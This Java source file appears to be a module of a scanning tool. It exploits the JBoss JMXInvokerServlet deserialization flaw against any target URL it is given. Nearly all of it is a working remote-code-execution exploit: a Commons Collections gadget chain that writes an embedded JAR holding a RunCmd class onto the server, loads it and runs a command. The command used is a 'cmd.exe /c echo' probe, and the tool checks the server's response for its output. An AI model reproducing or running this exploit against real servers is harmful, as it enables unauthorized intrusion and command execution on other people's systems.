package action.url;

import global.UrlGlobalDeal;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;

import tools.Logger;
import tools.HttpConnectionUtils;

public class JbossDeserialize {
	private static int default_port = 8080;
	private static String contentType = "aplication/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue";
	private static String path = "../.readme.html.tmp";
	private static byte[] jarPayload = {80, 75, 3, 4, 20, 0, 8, 8, 8, 0, -70, -90, 106, 74, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 20, 0, 4, 0, 77, 69, 84, 65, 45, 73, 78, 70, 47, 77, 65, 78, 73, 70, 69, 83, 84, 46, 77, 70, -2, -54, 0, 0, -13, 77, -52, -53, 76, 75, 45, 46, -47, 13, 75, 45, 42, -50, -52, -49, -77, 82, 48, -44, 51, -32, -27, -30, -27, 2, 0, 80, 75, 7, 8, -78, 127, 2, -18, 27, 0, 0, 0, 25, 0, 0, 0, 80, 75, 3, 4, 20, 0, 8, 8, 8, 0, -125, -108, 105, 74, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 46, 112, 114, 111, 106, 101, 99, 116, 117, 80, 65, 14, -62, 32, 16, 60, 107, -30, 31, 26, -18, -126, -34, 60, -48, -10, -96, -15, 108, 98, 125, 0, -62, -90, -95, 105, -95, 1, -38, -24, -17, 5, 74, 109, 106, -30, 109, 103, 118, 102, 103, -128, -106, -81, -82, -51, 70, 48, 86, 106, -107, -93, 35, 62, -96, 12, 20, -41, 66, -86, 58, 71, -113, -22, -70, 63, -95, -78, -40, 109, 105, 111, 116, 3, -36, 93, -64, 114, 35, 123, -25, -43, -98, -35, 80, -59, 58, 40, 42, -80, -18, -58, -34, -83, 102, -126, -110, -56, -124, 21, -41, 93, 7, -54, 21, -108, -52, 83, 96, -45, 29, 27, 1, 89, -95, -25, 32, 91, 113, -17, -127, 7, -108, -32, -39, 91, -103, 18, -111, 73, 105, -38, -44, 24, 120, 43, 123, 11, -72, 17, 14, 115, 109, -4, -64, 70, 22, 13, 96, -106, 10, -34, -63, 76, 61, -124, 108, -101, 48, 89, 19, -108, -4, -90, 36, 102, -82, -31, 35, -35, 96, 32, -87, 39, -16, -65, -63, -76, 15, 5, -94, 46, -98, 91, 14, 124, -97, -69, -2, -60, 15, 80, 75, 7, 8, -19, -68, -103, 38, -63, 0, 0, 0, -125, 1, 0, 0, 80, 75, 3, 4, 20, 0, 8, 8, 8, 0, 46, -91, 106, 74, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 18, 0, 0, 0, 106, 98, 111, 115, 115, 47, 82, 117, 110, 67, 109, 100, 46, 99, 108, 97, 115, 115, -123, 84, -37, 82, 26, 65, 16, 61, -125, -64, -82, -21, -94, -120, 87, -52, -59, -104, -101, -117, -88, -104, -69, 1, 47, -119, 70, 19, -109, -11, 18, -75, 76, 81, 21, 31, -106, 101, 52, 107, -63, 46, -75, -69, -92, -4, -93, -4, 1, -92, 66, 85, -14, -104, -86, 124, 75, -66, 33, 73, 15, -96, 96, 65, 85, -10, -95, -103, -23, 62, 125, -26, 116, 79, 15, -65, -2, 124, -5, 14, 96, 30, -121, 18, 2, 12, -22, 89, -50, -15, -68, -44, 126, -39, 94, 47, -26, 37, 4, 25, -94, 103, -58, 103, 35, 85, 48, -20, -45, -44, 110, -18, -116, -101, 62, 67, 120, -55, -78, 45, 127, -123, 97, 68, -45, 91, -47, 3, -33, -75, -20, -45, 76, -30, -120, 65, -39, 56, 55, 121, -55, -73, 28, -37, -109, -48, -53, 48, -44, 66, 93, 70, 24, -126, -21, 78, -98, 43, -24, -127, -86, 34, -124, 8, 67, -113, -106, 56, 82, 48, -128, 65, 9, 81, -122, -63, 86, 18, -55, -15, -83, 34, 87, 17, -61, 16, -79, -97, 114, -65, -23, 17, 18, 18, 122, 7, 48, 35, 88, 70, 84, -116, 98, -116, -114, -31, -25, -36, 100, -104, -18, -90, -75, -51, -75, -25, 58, 38, -9, -68, -116, -124, 56, -61, 104, -35, 111, 57, -87, -75, -14, -55, 9, 119, 121, 126, -97, 27, 121, -18, 74, -72, -58, 16, -65, -120, 109, -39, -91, -78, 79, 76, -36, 40, 54, -62, 10, 110, 96, 82, -62, -51, 43, -38, -101, -68, 42, 110, 97, -118, -95, -97, -76, -73, -27, 49, -116, 93, -24, -65, 74, 72, 21, 76, -32, -114, -24, -53, 93, -122, 113, -83, 43, 68, 52, 107, 28, -9, 5, 104, -102, 122, -36, 2, 53, -44, 80, 92, 66, -30, -94, -106, -74, -78, 27, 53, 41, -48, -96, 10, 51, -85, 98, 14, -13, 116, -85, 70, -87, -60, -19, 60, -61, -20, 127, 58, -43, -50, -110, -111, -79, -64, -64, 20, -95, -28, -95, -118, 71, 120, -52, 32, -109, -70, -68, 110, -39, 116, 59, -61, 90, 103, 34, -91, 60, -91, 70, 68, -108, -120, -78, 124, -7, 9, 33, -117, -94, -110, -80, 88, -91, 85, 100, -22, 76, -66, -45, -56, -111, -79, 76, -77, -39, -126, 71, -22, 7, -82, -86, 120, 33, -26, 38, 100, 22, 28, -113, 38, 73, -58, 34, -61, -128, 56, 121, -89, 92, -52, 113, -9, -48, -56, 21, 72, 68, 76, 119, 76, -93, 112, 100, -72, -106, -40, 55, -99, 65, -1, -109, -27, -111, 12, -67, 125, -32, 51, 12, -110, -23, 20, -117, -122, 104, 67, -84, 83, 57, -91, -107, -24, 58, -87, -39, 93, 6, -121, 33, -112, 115, -23, -78, -12, -18, -77, 35, -30, 94, -18, 50, -34, -39, 73, 34, 47, -44, -101, 22, 118, -71, 87, 46, -48, 59, 99, 98, -66, -11, 46, 111, -121, -80, -54, -127, 83, 118, 77, -66, 105, -119, 98, -6, 26, -14, -25, 5, 20, 83, -96, -105, 4, -15, 17, -125, -24, 40, 2, -112, 104, 23, -92, -99, 12, -123, -36, -125, -28, -107, -55, -29, -52, 84, -47, -9, 21, -3, -55, 10, -122, -73, 107, 24, -49, -42, 48, -111, -99, -83, -32, 122, 21, -73, -85, -72, -73, 83, -125, -106, -83, 98, 38, 29, -4, -126, 104, 60, 24, 15, 85, -112, -116, -91, -56, 124, -104, -85, -32, 65, 54, 29, -6, -7, -9, -73, -128, -60, -98, 84, -15, 44, 30, -84, -32, -71, 0, 44, -111, -95, 101, 58, 76, -96, -107, 26, -28, 108, 60, 92, -59, -53, -76, 20, -105, 126, -48, -111, 1, -84, -43, -1, 109, -6, -56, -54, 36, 73, -127, 74, -21, 73, -78, 26, -6, -111, 68, 20, -117, -12, -69, 70, 15, -3, 24, 67, 48, 48, -116, 2, 70, -80, 78, -24, -113, -24, 21, -110, -15, 10, 27, -11, -30, 28, 108, -30, 53, -107, -92, -62, -60, 27, 108, 17, -13, 36, -10, -16, 22, -17, -88, 120, -115, 34, 58, -74, -119, 63, -119, 8, 118, 104, 23, -62, 42, 22, -102, -85, 99, 98, -33, -91, 85, -104, -72, 123, 40, -25, 61, -75, -121, 97, -65, -82, -18, -32, 31, 80, 75, 7, 8, -1, -99, -68, -128, -44, 2, 0, 0, 16, 5, 0, 0, 80, 75, 3, 4, 20, 0, 8, 8, 8, 0, 35, -85, 105, 74, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 0, 0, 0, 46, 99, 108, 97, 115, 115, 112, 97, 116, 104, 125, -111, 65, 75, 66, 65, 16, -57, -49, 5, 125, -121, -57, -69, -73, -85, 80, 32, -15, 76, -60, 12, 18, 50, -80, 103, 87, 89, 119, 7, -35, -25, -66, -35, -57, -18, 62, -55, 99, -121, 64, -88, -16, 98, 117, -21, 22, 116, -21, 20, 74, 125, -98, -43, 62, 70, -49, 82, 10, 33, 79, -13, -97, -31, 55, 51, 127, 102, -126, -46, 101, 44, -68, 62, 104, -61, -107, 44, -6, 121, -108, -13, 61, -112, 84, 49, 46, 59, 69, -65, 25, 30, -17, 22, -4, -46, -31, -50, 118, 64, 5, 49, 38, 33, -74, -101, 37, 91, -65, 25, 72, -85, 7, 94, -113, 75, 86, -12, -115, -90, -66, -73, 40, -2, 72, -4, 63, 41, 120, 123, 69, 86, 14, 112, -45, 100, -21, 113, -103, -59, 92, 114, 99, 53, -79, 74, -29, 35, 48, 61, -85, 18, -20, -90, -45, -7, -8, -59, 77, -98, -35, -11, 4, -41, 72, -97, -72, -47, -99, 123, 31, -71, -31, -93, -69, 125, -104, 127, 12, 103, 79, 87, -77, -73, -101, -49, -41, -5, 37, 18, -83, 33, 88, -23, 14, 34, 9, -95, 93, 64, 84, -59, -79, -110, 38, -117, 66, 0, -75, 124, -95, 35, -94, 55, 25, -91, 74, -82, -116, 46, 6, 1, 21, 60, 49, -128, 34, 102, -111, 32, -87, -92, -35, -20, 76, -88, -42, -88, -74, 42, 103, -11, -80, 124, 82, -81, 54, -16, 58, -57, -91, 5, 45, -119, 64, 12, -38, 105, 7, -91, 124, -39, 9, 26, -99, 91, 34, 25, -47, -20, -30, 52, 28, 36, -128, 35, 13, 121, 84, 64, -71, -42, -34, -2, 38, 79, 42, -75, 73, 106, 87, -74, -38, 92, 126, -61, 1, -2, -5, -95, 47, 80, 75, 7, 8, 49, 111, 123, -40, 45, 1, 0, 0, -41, 1, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, -70, -90, 106, 74, -78, 127, 2, -18, 27, 0, 0, 0, 25, 0, 0, 0, 20, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 69, 84, 65, 45, 73, 78, 70, 47, 77, 65, 78, 73, 70, 69, 83, 84, 46, 77, 70, -2, -54, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, -125, -108, 105, 74, -19, -68, -103, 38, -63, 0, 0, 0, -125, 1, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 97, 0, 0, 0, 46, 112, 114, 111, 106, 101, 99, 116, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, 46, -91, 106, 74, -1, -99, -68, -128, -44, 2, 0, 0, 16, 5, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 88, 1, 0, 0, 106, 98, 111, 115, 115, 47, 82, 117, 110, 67, 109, 100, 46, 99, 108, 97, 115, 115, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, 35, -85, 105, 74, 49, 111, 123, -40, 45, 1, 0, 0, -41, 1, 0, 0, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 108, 4, 0, 0, 46, 99, 108, 97, 115, 115, 112, 97, 116, 104, 80, 75, 5, 6, 0, 0, 0, 0, 4, 0, 4, 0, -12, 0, 0, 0, -47, 5, 0, 0, 0, 0};
	
	public void run(String target) {
		String targetHost = "";
		target = standardization(target);
		
		if (target.endsWith("/")) {
			targetHost = target+"invoker/JMXInvokerServlet";
		} else {
			targetHost = target+"/invoker/JMXInvokerServlet";
		}
		
		if (check(targetHost)) 
			Logger.getInstance().insertResult(target);
	}
	
	public static String standardization(String target) {
		if (!target.startsWith("http"))
			target = "http://"+target;
		
		return target;
	}
	
	private boolean check(String targetHost) {
		if (!isVulnerable(targetHost))
			return false;

		String xmlUTF8 = "";
		try {
			byte[] payload = getPayload("cmd.exe /c echo fireXXX");
			byte[] result = getPayloadResponse(targetHost, contentType, payload);
			if (result==null || result.length==0)
				return false;
			
			xmlUTF8 = new String(result, "UTF-8");
			if (xmlUTF8.indexOf("fireXXX") != -1) {
				Logger.getInstance().insertLog("JbossDeserialize", targetHost);
				return true;  
			}
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			Logger.getInstance().insertLog("JbossDeserialize", targetHost+":UnsupportedEncodingException");
		} catch (Exception e) {
			// TODO Auto-generated catch block
		}  

		return false;
	}
	
	private boolean isVulnerable(String targetHost) {
		HttpConnectionUtils utils = new HttpConnectionUtils();
		if (!utils.openConnection(targetHost, "GET"))
			return false;
		
		int code = utils.getResponseCode();
		switch (code){
	      case 401:
	    	  Logger.getInstance().insertLog("Error", targetHost+"401错误，需要认证，请手动认证后再重试");
	    	  return false;
	      case 500:
	    	  Logger.getInstance().insertLog("Error", targetHost+"500错误，系统异常，请手动检查");
	    	  return false;
	      case 200:
	    	  break;
	      case -1:
	    	  return false;
	      default:
	    	return false;	  
		}

		if (!utils.findStringInHeader("Content-Type", "MarshalledValue")) {
			Logger.getInstance().insertLog("Error", targetHost+"未知错误，请手工验证");
			return false;
		}
		
		return true;
	}
	
	private byte[] getPayload(String command) throws Exception {
		final Transformer[] transforms = new Transformer[] {
       		 new ConstantTransformer(java.io.FileOutputStream.class),
       		 new InvokerTransformer("getConstructor",new Class[] { Class[].class },new Object[] { new Class[] { String.class } }),
       		 new InvokerTransformer("newInstance",new Class[] { Object[].class },new Object[] { new Object[] { path } }),
       		 new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { jarPayload }),
          		 new ConstantTransformer(java.net.URLClassLoader.class),
          		 new InvokerTransformer("getConstructor",new Class[] { Class[].class },new Object[] { new Class[] { java.net.URL[].class } }),
      		     new InvokerTransformer("newInstance",new Class[] { Object[].class },new Object[] { new Object[] { new java.net.URL[] { new java.net.URL("file:"+path) } } }),
      		     new InvokerTransformer("loadClass",new Class[] { String.class }, new Object[] { "jboss.RunCmd" }),
      		     new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { String.class } }),
      		     new InvokerTransformer("newInstance",new Class[] { Object[].class }, new Object[] { new Object[] {command} }) };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(new Class[] {Class.class, Map.class});
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(new Object[] {Retention.class, outmap});
        ByteArrayOutputStream bo=new ByteArrayOutputStream(10);
        ObjectOutputStream out = new ObjectOutputStream(bo);
        out.writeObject(instance);
        out.flush();
        out.close();
        
        return bo.toByteArray();
	}
	
	private byte[] getPayloadResponse(String targetHost, String contentType, byte[] payload) {
		byte[] r = null;
		HttpConnectionUtils utils = new HttpConnectionUtils();
		
		Map<String, String> headers = new HashMap<String, String>();
		headers.put("Content-Type", contentType);
		
		if (!utils.openConnection(targetHost, "POST", headers))
			return r;
		
		r = utils.getPostResponse(payload);
		
	    return r;
	}
}
